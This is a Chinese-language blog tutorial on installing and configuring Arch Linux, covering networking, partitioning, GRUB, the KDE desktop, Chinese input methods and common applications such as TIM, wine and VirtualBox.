<h3 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络:"></a>连接网络:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里采用连接wifi的形式</span></span><br><span class="line">rfkill unblock all (解除内核对设备的锁定)</span><br><span class="line">ip link <span class="built_in">set</span> wlan0 up</span><br><span class="line">iw dev wlan0 scan | less</span><br><span class="line">iw dev wlan0 connect [名称] key 0:[密码]</span><br><span class="line"></span><br><span class="line">dhclient <span class="comment"># 获取ip 或者dhcpcd</span></span><br><span class="line">ping baidu.com <span class="comment"># 测试网络</span></span><br></pre></td></tr></table></figure>

<h4 id="查看是否支持uefi"><a href="#查看是否支持uefi" class="headerlink" title="查看是否支持uefi"></a>查看是否支持uefi</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /sys/firmware/efi/</span><br></pre></td></tr></table></figure>

<h4 id="对时"><a href="#对时" class="headerlink" title="对时:"></a>对时:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="分区"><a href="#分区" class="headerlink" title="分区:"></a>分区:</h4><p>分两个区,一个根目录 /,另一个是开机系统的/boot/efi<br>执行 fdisk -l 或者 lsblk 查看硬盘设备名<br>执行 fdisk /dev/sda 开始分区, dev/sda 是硬盘设备名</p>
<p>磁盘类型参数:<br>-o dos<br>-g gpt</p>
<h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/boot/efi分区不能ext4格式:</span><br><span class="line">mkfs.ext4 /dev/nvme0n1p5</span><br><span class="line">mkfs.vfat -F32  /dev/nvme0n1p6</span><br></pre></td></tr></table></figure>

<h4 id="挂载"><a href="#挂载" class="headerlink" title="挂载:"></a>挂载:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/nvme0n1p5 /mnt</span><br><span class="line">mkdir -p /mnt/boot/efi</span><br><span class="line">mount /dev/nvme0n1p6 /mnt/boot/efi</span><br></pre></td></tr></table></figure>

<h4 id="修改镜像地址"><a href="#修改镜像地址" class="headerlink" title="修改镜像地址:"></a>修改镜像地址:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.bak</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>


<h4 id="安装基础包"><a href="#安装基础包" class="headerlink" title="安装基础包:"></a>安装基础包:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Sy <span class="comment">#同步</span></span><br><span class="line">pacstrap /mnt base  base-devel linux linux-firmware</span><br><span class="line"><span class="comment"># linux 是Linux内核</span></span><br></pre></td></tr></table></figure>

<h4 id="生成-genfstab"><a href="#生成-genfstab" class="headerlink" title="生成 genfstab:"></a>生成 genfstab:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h4 id="进入新系统"><a href="#进入新系统" class="headerlink" title="进入新系统:"></a>进入新系统:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt /bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h4><p>设置为国内上海时区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime</span><br></pre></td></tr></table></figure>
<h4 id="同步硬件时钟"><a href="#同步硬件时钟" class="headerlink" title="同步硬件时钟"></a>同步硬件时钟</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hwclock --systohc <span class="comment"># 也可以[--utc]</span></span><br></pre></td></tr></table></figure>


<h4 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑 /etc/locale.gen 取消注释</span></span><br><span class="line">vim /etc/locale.gen</span><br><span class="line"><span class="comment">#取消下面两行的注释后保存</span></span><br><span class="line"><span class="comment">#en_US.UTF-8 UTF-8</span></span><br><span class="line"><span class="comment">#zh_CN.UTF-8 UTF-8</span></span><br><span class="line"><span class="comment">#zh_CN.GB18030 GB18030</span></span><br><span class="line"><span class="comment">#zh_CN.GBK GBK</span></span><br><span class="line"><span class="comment">#zh_CN GB2312</span></span><br><span class="line"><span class="comment">#zh_HK.UTF-8 UTF-8</span></span><br><span class="line"><span class="comment">#zh_HK BIG5-HKSCS</span></span><br><span class="line"><span class="comment">#生成语言</span></span><br><span class="line">locale-gen</span><br><span class="line"><span class="comment">#编辑 /etc/locale.conf设置默认语言为英文</span></span><br><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure>


<h4 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h4><p>vim /etc/hostname<br>把主机名写进去, 我这里写入的是 arch<br>还要记得修改 /etc/hosts 文件<br>127.0.0.1        arch</p>
<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure>
<h4 id="安装网络包"><a href="#安装网络包" class="headerlink" title="安装网络包:"></a>安装网络包:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S networkmanager dhcpcd</span><br></pre></td></tr></table></figure>

<h4 id="安装-openssh"><a href="#安装-openssh" class="headerlink" title="安装 openssh"></a>安装 openssh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Sy openssh</span><br><span class="line"><span class="comment">#写入服务: systemctl enable sshd</span></span><br><span class="line"><span class="comment">#启动服务: systemctl start sshd.service</span></span><br></pre></td></tr></table></figure>


<h4 id="设置自动连接网络（有线）"><a href="#设置自动连接网络（有线）" class="headerlink" title="设置自动连接网络（有线）"></a>设置自动连接网络（有线）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> dhcpcd</span><br><span class="line">systemctl start  dhcpcd.service</span><br></pre></td></tr></table></figure>

<h4 id="安装GRUB"><a href="#安装GRUB" class="headerlink" title="安装GRUB"></a>安装GRUB</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装基本包</span></span><br><span class="line">mkdir /boot/efi/EFI/boot</span><br><span class="line">pacman -S grub-efi-x86_64</span><br><span class="line">pacman -S efibootmgr</span><br><span class="line">pacman -S os-prober</span><br><span class="line"><span class="comment"># 安装grub到磁盘上</span></span><br><span class="line">grub-install --efi-directory=/boot/efi --bootloader-id=grub</span><br><span class="line">cp /boot/efi/EFI/grub/grubx64.efi /boot/efi/EFI/boot/bootx64.efi</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h4 id="umount分区并重启机器"><a href="#umount分区并重启机器" class="headerlink" title="umount分区并重启机器"></a>umount分区并重启机器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount /mnt/boot/efi</span><br><span class="line">umount /mnt</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h3 id="安装图形话界面"><a href="#安装图形话界面" class="headerlink" title="安装图形话界面"></a>安装图形话界面</h3><h4 id="开机后启动网络服务"><a href="#开机后启动网络服务" class="headerlink" title="开机后启动网络服务"></a>开机后启动网络服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start NetworkManager.service</span><br></pre></td></tr></table></figure>

<h4 id="启动wpa-supplicant服务"><a href="#启动wpa-supplicant服务" class="headerlink" title="启动wpa_supplicant服务"></a>启动wpa_supplicant服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start wpa_supplicant.service</span><br><span class="line"><span class="comment"># 查看 wifi 列表：</span></span><br><span class="line">nmcli dev wifi list</span><br><span class="line"><span class="comment"># 连接wifi</span></span><br><span class="line">nmcli device wifi connect [wifi name] password [wifi password]</span><br></pre></td></tr></table></figure>

<h4 id="安装基本网络命令包"><a href="#安装基本网络命令包" class="headerlink" title="安装基本网络命令包"></a>安装基本网络命令包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S net-tools dnsutils inetutils iproute2</span><br></pre></td></tr></table></figure>


<h4 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h4><p>[[Install|安装]软件包 mesa，它提供 DRI 和 3D 加速<br>若需要x86_64下的32位支持,可以从 multilib 安装 lib32-mesa.<br>要使用 Xorg 2D 加速 DDX 驱动，请安装软件包 xf86-video-ati.<br>加速视频解码 由 mesa-vdpau 和 lib32-mesa-vdpau 包提供支持</p>
<h5 id="硬件接口服务"><a href="#硬件接口服务" class="headerlink" title="硬件接口服务"></a>硬件接口服务</h5><p>参考 xorg-server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xorg-server</span><br></pre></td></tr></table></figure>
<h5 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xf86-video-ati</span><br><span class="line"><span class="comment">#xf86-video-intel intel显卡驱动</span></span><br><span class="line"><span class="comment">#xf86-video-ati  AMD显卡驱动</span></span><br></pre></td></tr></table></figure>

<h4 id="安装输入设备"><a href="#安装输入设备" class="headerlink" title="安装输入设备"></a>安装输入设备</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xf86-input-libinput // (xorg-server已经默认安装)</span><br></pre></td></tr></table></figure>
<h4 id="安装触摸板驱动"><a href="#安装触摸板驱动" class="headerlink" title="安装触摸板驱动"></a>安装触摸板驱动</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xf86-input-synaptics</span><br></pre></td></tr></table></figure>


<h4 id="安装显示管理器"><a href="#安装显示管理器" class="headerlink" title="安装显示管理器"></a>安装显示管理器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S sddm sddm-kcm</span><br></pre></td></tr></table></figure>
<h4 id="设置SDDM服务"><a href="#设置SDDM服务" class="headerlink" title="设置SDDM服务"></a>设置SDDM服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure>

<h4 id="安装kde桌面"><a href="#安装kde桌面" class="headerlink" title="安装kde桌面"></a>安装kde桌面</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-desktop</span><br></pre></td></tr></table></figure>

<h4 id="安装基本的软件"><a href="#安装基本的软件" class="headerlink" title="安装基本的软件"></a>安装基本的软件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S kdebase</span><br><span class="line"><span class="comment">#包括  dolphin kate kdialog keditbookmarks kfind helpcenter onqueror # konsole kwrite</span></span><br></pre></td></tr></table></figure>

<h4 id="安装中文字体"><a href="#安装中文字体" class="headerlink" title="安装中文字体"></a>安装中文字体</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S ttf-dejavu ttf-liberation wqy-microhei</span><br><span class="line">wqy-microhei <span class="comment">#温泉驿体</span></span><br></pre></td></tr></table></figure>

<h4 id="安装声音软件包"><a href="#安装声音软件包" class="headerlink" title="安装声音软件包"></a>安装声音软件包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S alsa-utils pulseaudio pulseaudio-alsa</span><br></pre></td></tr></table></figure>

<h4 id="安装ntfs磁盘的支持"><a href="#安装ntfs磁盘的支持" class="headerlink" title="安装ntfs磁盘的支持"></a>安装ntfs磁盘的支持</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S ntfs-3g</span><br></pre></td></tr></table></figure>


<h4 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S fcitx fcitx-rime fcitx-im kcm-fcitx fcitx-googlepinyin</span><br></pre></td></tr></table></figure>

<h4 id="安装网络工具"><a href="#安装网络工具" class="headerlink" title="安装网络工具"></a>安装网络工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-nm</span><br><span class="line"><span class="comment"># 系统托盘网络管理工具</span></span><br></pre></td></tr></table></figure>

<h4 id="设置pacman彩色输出"><a href="#设置pacman彩色输出" class="headerlink" title="设置pacman彩色输出"></a>设置pacman彩色输出</h4><p>打开/etc/pacman.conf文件<br>找到被注释的#Color<br>改为Color,pacman就会输出彩色信息方便查看</p>
<h4 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S arc-kde</span><br></pre></td></tr></table></figure>

<h4 id="首次用户目录生成"><a href="#首次用户目录生成" class="headerlink" title="首次用户目录生成"></a>首次用户目录生成</h4><p>安装 xdg-user-dirs</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xdg-user-dirs</span><br><span class="line">xdg-user-dirs-update <span class="comment">#跟新用户目录</span></span><br><span class="line"><span class="comment">#若不慎删除了某个默认用户文件夹，使用如下命令强制重新生成家目录文件夹</span></span><br><span class="line"><span class="comment">#xdg-user-dirs-update --force</span></span><br><span class="line"><span class="comment"># 该命令只对当前用户起作用</span></span><br></pre></td></tr></table></figure>




<h4 id="安装图标"><a href="#安装图标" class="headerlink" title="安装图标"></a>安装图标</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S papirus-icon-theme</span><br></pre></td></tr></table></figure>

<h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><p>务必添加一个 用户 ，否则后面sddm显示管理器登录的时候无法登录，sddm不会列出root用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -g users -s /bin/bash 用户名</span><br><span class="line">passwd 用户名</span><br><span class="line"><span class="comment">#为刚才添加的用户设置密码</span></span><br><span class="line">vim /etc/sudoers</span><br><span class="line"><span class="comment">#在 root ALL=(ALL) ALL 下面添加</span></span><br><span class="line"><span class="comment">#用户名 ALL=(ALL) ALL</span></span><br><span class="line"><span class="comment">#为你刚才创建的用户 添加sudo权限</span></span><br></pre></td></tr></table></figure>

<h4 id="调节亮度"><a href="#调节亮度" class="headerlink" title="调节亮度:"></a>调节亮度:</h4><p>查看亮度最大值:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只能root</span></span><br><span class="line">cat /sys/class/backlight/amdgpu_bl0/max_brightness</span><br><span class="line"><span class="built_in">echo</span> 100 &gt; /sys/class/backlight/amdgpu_bl0/brightness</span><br></pre></td></tr></table></figure>
<h4 id="终端显示电量"><a href="#终端显示电量" class="headerlink" title="终端显示电量:"></a>终端显示电量:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S acpi</span><br></pre></td></tr></table></figure>
<h4 id="设置grub主题"><a href="#设置grub主题" class="headerlink" title="设置grub主题"></a>设置grub主题</h4><h5 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h5><p>可以到 gnome-look 选择喜欢的主题下载</p>
<h5 id="解压缩主题包"><a href="#解压缩主题包" class="headerlink" title="解压缩主题包"></a>解压缩主题包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -xf 主题包名</span><br></pre></td></tr></table></figure>

<h5 id="复制到主题目录"><a href="#复制到主题目录" class="headerlink" title="复制到主题目录"></a>复制到主题目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r 主题包名 /boot/grub/themes/</span><br></pre></td></tr></table></figure>
<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/grub.d/00_header</span><br></pre></td></tr></table></figure>


<h5 id="添加如下内容："><a href="#添加如下内容：" class="headerlink" title="添加如下内容："></a>添加如下内容：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_THEME=<span class="string">&quot;/boot/grub/themes/主题包名/theme.txt&quot;</span></span><br><span class="line">GRUB_GFXMODE=<span class="string">&quot;1920x1200x32&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="更新配置文件"><a href="#更新配置文件" class="headerlink" title="更新配置文件"></a>更新配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>




<h2 id="Instal-daily-software"><a href="#Instal-daily-software" class="headerlink" title="Instal daily software"></a>Instal daily software</h2><h4 id="配置源"><a href="#配置源" class="headerlink" title="配置源"></a>配置源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">打开/etc/pacman.conf，在末尾加上</span><br><span class="line"><span class="comment">#[archlinuxcn]</span></span><br><span class="line"><span class="comment">#SigLevel = Optional TrustAll</span></span><br><span class="line"><span class="comment">#Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</span></span><br><span class="line"><span class="comment">#或者使用清华的镜像源</span></span><br><span class="line"><span class="comment">#[archlinuxcn]</span></span><br><span class="line"><span class="comment">#SigLevel = Optional TrustAll</span></span><br><span class="line"><span class="comment">#Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装key-ring</span></span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br><span class="line">更新软件仓库</span><br><span class="line">sudo pacman -Sy</span><br></pre></td></tr></table></figure>

<h4 id="安装网易云音乐"><a href="#安装网易云音乐" class="headerlink" title="安装网易云音乐."></a>安装网易云音乐.</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S netease-cloud-music</span><br></pre></td></tr></table></figure>
<h4 id="安装搜狗拼音输入法"><a href="#安装搜狗拼音输入法" class="headerlink" title="安装搜狗拼音输入法"></a>安装搜狗拼音输入法</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>由于搜狗拼音输入法依赖于Fcitx，在安装搜狗拼音输入法之前，需要先行安装Fcitx，在终端窗口下直接输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx</span><br></pre></td></tr></table></figure>
<p>即可完成安装，需要注意的是，仅仅安装这一项是不够的，这样在安装完成之后，Fcitx基本上是处于不可用的状态，我们还需要安装以下几个包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx-configtool</span><br><span class="line">sudo pacman -S fcitx-gtk2 fcitx-gtk3 fcitx-qt4 fcitx-qt5</span><br><span class="line">sudo pacman -S fcitx-sogoupinyin</span><br><span class="line"><span class="comment"># 安装配置工具</span></span><br><span class="line">sudo pacman -S fcitx-configtool</span><br></pre></td></tr></table></figure>
<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>安装完之后我们还不可以直接使用，还需要进行一定的配置，用文本编辑器打开~/.xprofile，没有就新建，在其末尾添加以下几行：<br>export GTK_IM_MODULE=fcitx<br>export QT_IM_MODULE=fcitx<br>export XMODIFIERS=”@im=fcitx”<br>然后注销后重新登录，或者重启后重新登录</p>
<h4 id="安装-TIM"><a href="#安装-TIM" class="headerlink" title="安装 TIM:"></a>安装 TIM:</h4><p>所以首先要打开multilab软件源. 打开/etc/pacman.conf, 找到[multilab]<br>sudo vim /etc/pacman.conf<br>[multilib]<br>Include = /etc/pacman.d/mirrorlist</p>
<h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S deepin.com.qq.office</span><br></pre></td></tr></table></figure>

<h5 id="解决打不开问题"><a href="#解决打不开问题" class="headerlink" title="解决打不开问题:"></a>解决打不开问题:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gnome-settings-daemon</span><br><span class="line">nohup /usr/lib/gsd-xsettings &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>


<h5 id="解决不能输入中文"><a href="#解决不能输入中文" class="headerlink" title="解决不能输入中文"></a>解决不能输入中文</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /opt/deepinwine/apps/run.sh</span><br><span class="line"><span class="comment"># add:</span></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">&quot;@im=fcitx&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h4><p>所以首先要打开multilab软件源. 打开/etc/pacman.conf, 找到[multilab]<br>[multilib]<br>Include = /etc/pacman.d/mirrorlist</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S wine wine_gecko wine-mono winetricks</span><br></pre></td></tr></table></figure>
<h4 id="安装virtualBox"><a href="#安装virtualBox" class="headerlink" title="安装virtualBox"></a>安装virtualBox</h4><h5 id="安装linux-headers"><a href="#安装linux-headers" class="headerlink" title="安装linux-headers"></a>安装linux-headers</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S linux-headers</span><br></pre></td></tr></table></figure>
<h5 id="确认linux内核的版本"><a href="#确认linux内核的版本" class="headerlink" title="确认linux内核的版本"></a>确认linux内核的版本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>
<p>如果和header的版本不一致，需要更新内核,否则的话会在安装virtualbox的时候报错“missing kernal module tree .解决办法根系内核: sudo pacman -S linux,.然后安装virtualbox，安装默认选项不选，我们选2，也就是virtualbox-host-modules-arch</p>
<h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Sy virtualbox</span><br><span class="line">sudo pacman -S virtualbox-guest-iso <span class="comment">#附加功能</span></span><br></pre></td></tr></table></figure>
<h5 id="如何让虚拟机屏幕分辨率可以自由调整"><a href="#如何让虚拟机屏幕分辨率可以自由调整" class="headerlink" title="如何让虚拟机屏幕分辨率可以自由调整"></a>如何让虚拟机屏幕分辨率可以自由调整</h5><p>在安装好虚拟机系统并进入之后，我们需下载一个VBoxGuestAdditions.iso(设备-&gt;安装增强功能)，然后如果是ubuntu19.10，会提示你输入密码安装，安装后即可自动调整，别的系统应该与此类似</p>
<h5 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹:"></a>共享文件夹:</h5><p>先在设置共享文件夹, 然或进入虚拟系统中挂在.<br>此处我选择在/mnt下创建一个“share”目录，将刚刚的“share”目录与“share”目录关联起来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /mnt</span><br><span class="line">sudo mkdir share</span><br><span class="line"><span class="comment"># 将“share”目录与“share”目录进行关联：</span></span><br><span class="line">sudo mount -t vboxsf share /mnt/share</span><br></pre></td></tr></table></figure>

<h5 id="安装-有道词典"><a href="#安装-有道词典" class="headerlink" title="安装 有道词典:"></a>安装 有道词典:</h5><p>到官网下载二进制包<br>安装依赖:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S tesseract-data-eng</span><br><span class="line">sudo pacman -S tesseract-data-chi_tra</span><br><span class="line">sudo pacman -S tesseract-data-chi_sim</span><br><span class="line"><span class="comment">#然后通过报错找相关的依赖包</span></span><br></pre></td></tr></table></figure>

<h4 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h4><p>ksystemlog     //查看日志<br>ark            //压缩文件管理<br>kget           //文件下载<br>kcalc          //计算器<br>kcolorchooser  //取色配色工具<br>print-manager  //打印机管理<br>spectacle      // 截屏工具<br>latte-dock     //类似于mac<br>gimp           //作图工具<br>typora         //写markdown</p>
